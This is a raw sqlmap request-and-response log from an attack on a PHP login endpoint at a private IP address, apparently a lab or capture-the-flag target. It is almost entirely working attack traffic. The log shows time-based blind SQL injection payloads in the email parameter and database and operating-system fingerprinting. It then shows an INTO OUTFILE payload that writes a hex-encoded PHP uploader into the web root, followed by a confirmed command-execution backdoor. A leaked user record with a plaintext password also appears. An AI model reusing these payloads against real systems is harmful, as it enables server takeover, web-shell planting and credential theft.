GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%203721%20FROM%20%28SELECT%28SLEEP%285-%28IF%2836%3D71%2C0%2C5%29%29%29%29%29wXST%29%20AND%20%27nuXq%27%3D%27nuXq&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:44] [TRAFFIC IN] HTTP response [#149] (200 OK):
Date: Sun, 19 Oct 2025 07:42:44 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 191
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%203721%20FROM%20%28SELECT%28SLEEP%285-%28IF%2836%3D71%2C0%2C5%29%29%29%29%29wXST%29%20AND%20%27nuXq%27%3D%27nuXq&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 3721 FROM (SELECT(SLEEP(5-(IF(36=71,0,5)))))wXST) AND 'nuXq'='nuXq'"
    ]
}
[03:42:44] [PAYLOAD] test@chatai.com' AND (SELECT 9327 FROM (SELECT(SLEEP(5-(IF(36=74,0,5)))))wGRr) AND 'RbYZ'='RbYZ
[03:42:44] [TRAFFIC OUT] HTTP request [#150]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209327%20FROM%20%28SELECT%28SLEEP%285-%28IF%2836%3D74%2C0%2C5%29%29%29%29%29wGRr%29%20AND%20%27RbYZ%27%3D%27RbYZ&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:44] [TRAFFIC IN] HTTP response [#150] (200 OK):
Date: Sun, 19 Oct 2025 07:42:44 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 191
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209327%20FROM%20%28SELECT%28SLEEP%285-%28IF%2836%3D74%2C0%2C5%29%29%29%29%29wGRr%29%20AND%20%27RbYZ%27%3D%27RbYZ&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 9327 FROM (SELECT(SLEEP(5-(IF(36=74,0,5)))))wGRr) AND 'RbYZ'='RbYZ'"
    ]
}
[03:42:44] [PAYLOAD] test@chatai.com' AND (SELECT 6767 FROM (SELECT(SLEEP(5-(IF(74=71,0,5)))))wzqG) AND 'xehA'='xehA
[03:42:44] [TRAFFIC OUT] HTTP request [#151]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%206767%20FROM%20%28SELECT%28SLEEP%285-%28IF%2874%3D71%2C0%2C5%29%29%29%29%29wzqG%29%20AND%20%27xehA%27%3D%27xehA&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:45] [TRAFFIC IN] HTTP response [#151] (200 OK):
Date: Sun, 19 Oct 2025 07:42:44 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 191
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%206767%20FROM%20%28SELECT%28SLEEP%285-%28IF%2874%3D71%2C0%2C5%29%29%29%29%29wzqG%29%20AND%20%27xehA%27%3D%27xehA&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 6767 FROM (SELECT(SLEEP(5-(IF(74=71,0,5)))))wzqG) AND 'xehA'='xehA'"
    ]
}
[03:42:45] [PAYLOAD] test@chatai.com' AND (SELECT 8236 FROM (SELECT(SLEEP(5-(IF(71=71,0,5)))))HLki) AND 'QJIv'='QJIv
[03:42:45] [TRAFFIC OUT] HTTP request [#152]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%208236%20FROM%20%28SELECT%28SLEEP%285-%28IF%2871%3D71%2C0%2C5%29%29%29%29%29HLki%29%20AND%20%27QJIv%27%3D%27QJIv&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:55] [TRAFFIC IN] HTTP response [#152] (200 OK):
Date: Sun, 19 Oct 2025 07:42:45 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 191
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%208236%20FROM%20%28SELECT%28SLEEP%285-%28IF%2871%3D71%2C0%2C5%29%29%29%29%29HLki%29%20AND%20%27QJIv%27%3D%27QJIv&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 8236 FROM (SELECT(SLEEP(5-(IF(71=71,0,5)))))HLki) AND 'QJIv'='QJIv'"
    ]
}
[03:42:55] [PAYLOAD] test@chatai.com' AND (SELECT 4008 FROM (SELECT(SLEEP(5-(IF(74 71,0,5)))))aoIk) AND 'nwOo'='nwOo
[03:42:55] [TRAFFIC OUT] HTTP request [#153]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%204008%20FROM%20%28SELECT%28SLEEP%285-%28IF%2874%2071%2C0%2C5%29%29%29%29%29aoIk%29%20AND%20%27nwOo%27%3D%27nwOo&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:55] [TRAFFIC IN] HTTP response [#153] (200 OK):
Date: Sun, 19 Oct 2025 07:42:55 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=r8ifik4vjv8t1m6cckeog6i6ta; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%204008%20FROM%20%28SELECT%28SLEEP%285-%28IF%2874%2071%2C0%2C5%29%29%29%29%29aoIk%29%20AND%20%27nwOo%27%3D%27nwOo&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:55] [DEBUG] checking for parameter length constraining mechanisms
[03:42:55] [PAYLOAD] test@chatai.com' AND (SELECT 2347 FROM (SELECT(SLEEP(5-(IF(7540=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                7540,0,5)))))gFeP) AND 'nlDB'='nlDB
[03:42:55] [TRAFFIC OUT] HTTP request [#154]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%202347%20FROM%20%28SELECT%28SLEEP%285-%28IF%287540%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%207540%2C0%2C5%29%29%29%29%29gFeP%29%20AND%20%27nlDB%27%3D%27nlDB&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:43:05] [TRAFFIC IN] HTTP response [#154] (200 OK):
Date: Sun, 19 Oct 2025 07:42:55 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 707
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%202347%20FROM%20%28SELECT%28SLEEP%285-%28IF%287540%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%207540%2C0%2C5%29%29%29%29%29gFeP%29%20AND%20%27nlDB%27%3D%27nlDB&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 2347 FROM (SELECT(SLEEP(5-(IF(7540=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                7540,0,5)))))gFeP) AND 'nlDB'='nlDB'"
    ]
}
[03:43:05] [DEBUG] checking for filtered characters
[03:43:05] [PAYLOAD] test@chatai.com' AND (SELECT 2869 FROM (SELECT(SLEEP(5-(IF(3294>3293,0,5)))))DuHH) AND 'kleG'='kleG
[03:43:05] [TRAFFIC OUT] HTTP request [#155]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%202869%20FROM%20%28SELECT%28SLEEP%285-%28IF%283294%3E3293%2C0%2C5%29%29%29%29%29DuHH%29%20AND%20%27kleG%27%3D%27kleG&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:43:15] [TRAFFIC IN] HTTP response [#155] (200 OK):
Date: Sun, 19 Oct 2025 07:43:05 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%202869%20FROM%20%28SELECT%28SLEEP%285-%28IF%283294%3E3293%2C0%2C5%29%29%29%29%29DuHH%29%20AND%20%27kleG%27%3D%27kleG&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 2869 FROM (SELECT(SLEEP(5-(IF(3294>3293,0,5)))))DuHH) AND 'kleG'='kleG'"
    ]
}
GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@chatai.com' AND (SELECT 9289 FROM (SELECT(SLEEP(5)))ihmY) AND 'AewC'='AewC&password=123
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[03:43:31] [INFO] the back-end DBMS is MySQL
[03:43:31] [PAYLOAD] test@chatai.com' AND (SELECT 9994 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))oTLX) AND 'VZPO'='VZPO
[03:43:31] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[03:43:31] [TRAFFIC OUT] HTTP request [#156]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209994%20FROM%20%28SELECT%28SLEEP%285-%28IF%28VERSION%28%29%20LIKE%200x254d61726961444225%2C0%2C5%29%29%29%29%29oTLX%29%20AND%20%27VZPO%27%3D%27VZPO&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:43:42] [TRAFFIC IN] HTTP response [#156] (200 OK):
Date: Sun, 19 Oct 2025 07:43:31 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 221
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%209994%20FROM%20%28SELECT%28SLEEP%285-%28IF%28VERSION%28%29%20LIKE%200x254d61726961444225%2C0%2C5%29%29%29%29%29oTLX%29%20AND%20%27VZPO%27%3D%27VZPO&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 9994 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))oTLX) AND 'VZPO'='VZPO'"
    ]
}
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[03:43:57] [INFO] going to use a web backdoor for command prompt
[03:43:57] [DEBUG] going to use '/tmp' as temporary files directory
[03:43:57] [INFO] fingerprinting the back-end DBMS operating system
[03:43:57] [PAYLOAD] test@chatai.com' AND (SELECT 8836 FROM (SELECT(SLEEP(5-(IF(0x57=UPPER(MID(@@version_compile_os,1,1)),0,5)))))HzyH) AND 'dfgk'='dfgk
[03:43:57] [TRAFFIC OUT] HTTP request [#157]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%208836%20FROM%20%28SELECT%28SLEEP%285-%28IF%280x57%3DUPPER%28MID%28%40%40version_compile_os%2C1%2C1%29%29%2C0%2C5%29%29%29%29%29HzyH%29%20AND%20%27dfgk%27%3D%27dfgk&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:44:07] [TRAFFIC IN] HTTP response [#157] (200 OK):
Date: Sun, 19 Oct 2025 07:43:57 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 227
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20%28SELECT%208836%20FROM%20%28SELECT%28SLEEP%285-%28IF%280x57%3DUPPER%28MID%28%40%40version_compile_os%2C1%2C1%29%29%2C0%2C5%29%29%29%29%29HzyH%29%20AND%20%27dfgk%27%3D%27dfgk&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND (SELECT 8836 FROM (SELECT(SLEEP(5-(IF(0x57=UPPER(MID(@@version_compile_os,1,1)),0,5)))))HzyH) AND 'dfgk'='dfgk'"
    ]
}
[03:44:07] [INFO] the back-end DBMS operating system is Windows
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[03:44:10] [INFO] retrieved the web server document root: 'C:\xampp\htdocs'
[03:44:10] [INFO] retrieved web server absolute paths: 'C:/xampp/htdocs/ai/includes/user_login.php, C:/xampp/htdocs/ai/includes/functions.php'
[03:44:10] [INFO] trying to upload the file stager on 'C:/xampp/htdocs/' via LIMIT 'LINES TERMINATED BY' method
[03:44:10] [PAYLOAD] test@chatai.com' LIMIT 0,1 INTO OUTFILE 'C:/xampp/htdocs/tmpuvanm.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d433a5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -
[03:44:10] [TRAFFIC OUT] HTTP request [#158]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27C%3A%2Fxampp%2Fhtdocs%2Ftmpuvanm.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d433a5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:44:10] [TRAFFIC IN] HTTP response [#158] (200 OK):
Date: Sun, 19 Oct 2025 07:44:10 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=efrrpgi10emlc7s48ibm7mpt8c; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27C%3A%2Fxampp%2Fhtdocs%2Ftmpuvanm.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d433a5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:44:10] [DEBUG] trying to see if the file is accessible from 'http://10.10.48.19:80/xampp/htdocs/tmpuvanm.php'
[03:44:10] [TRAFFIC OUT] HTTP request [#159]:
GET /xampp/htdocs/tmpuvanm.php HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Cookie: PHPSESSID=efrrpgi10emlc7s48ibm7mpt8c
Connection: close

[03:44:11] [DEBUG] declared web page charset 'iso-8859-1'
[03:44:11] [TRAFFIC IN] HTTP response [#159] (404 Not Found):
Date: Sun, 19 Oct 2025 07:44:10 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 298
Connection: close
Content-Type: text/html; charset=iso-8859-1
URI: http://10.10.48.19:80/xampp/htdocs/tmpuvanm.php

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29 Server at 10.10.48.19 Port 80</address>
</body></html>

[03:44:11] [DEBUG] page not found (404)
[03:44:11] [DEBUG] trying to see if the file is accessible from 'http://10.10.48.19:80/htdocs/tmpuvanm.php'
[03:44:11] [TRAFFIC OUT] HTTP request [#160]:
GET /htdocs/tmpuvanm.php HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Cookie: PHPSESSID=efrrpgi10emlc7s48ibm7mpt8c
Connection: close

[03:44:11] [TRAFFIC IN] HTTP response [#160] (404 Not Found):
Date: Sun, 19 Oct 2025 07:44:10 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 298
Connection: close
Content-Type: text/html; charset=iso-8859-1
URI: http://10.10.48.19:80/htdocs/tmpuvanm.php

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29 Server at 10.10.48.19 Port 80</address>
</body></html>

[03:44:11] [DEBUG] trying to see if the file is accessible from 'http://10.10.48.19:80/tmpuvanm.php'
[03:44:11] [TRAFFIC OUT] HTTP request [#161]:
GET /tmpuvanm.php HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Cookie: PHPSESSID=efrrpgi10emlc7s48ibm7mpt8c
Connection: close

[03:44:11] [TRAFFIC IN] HTTP response [#161] (200 OK):
Date: Sun, 19 Oct 2025 07:44:11 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Content-Length: 351
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19:80/tmpuvanm.php

1       test@chatai.com 12345678        2023-02-21 09:05:46<form action=/tmpuvanm.php method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=C:\xampp\htdocs\> <input type=submit name=upload value=upload></form>
[03:44:11] [INFO] the file stager has been successfully uploaded on 'C:/xampp/htdocs/' - http://10.10.48.19:80/tmpuvanm.php
[03:44:11] [TRAFFIC OUT] HTTP request [#163]:
GET /tmpbgpne.php?cmd=echo%20command%20execution%20test HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Cookie: PHPSESSID=efrrpgi10emlc7s48ibm7mpt8c
Connection: close

[03:44:11] [TRAFFIC IN] HTTP response [#163] (200 OK):
Date: Sun, 19 Oct 2025 07:44:11 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Content-Length: 36
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19:80/tmpbgpne.php?cmd=echo%20command%20execution%20test

<pre>command execution test 
</pre>
[03:44:11] [INFO] the backdoor has been successfully uploaded on 'C:/xampp/htdocs/' - http://10.10.48.19:80/tmpbgpne.php
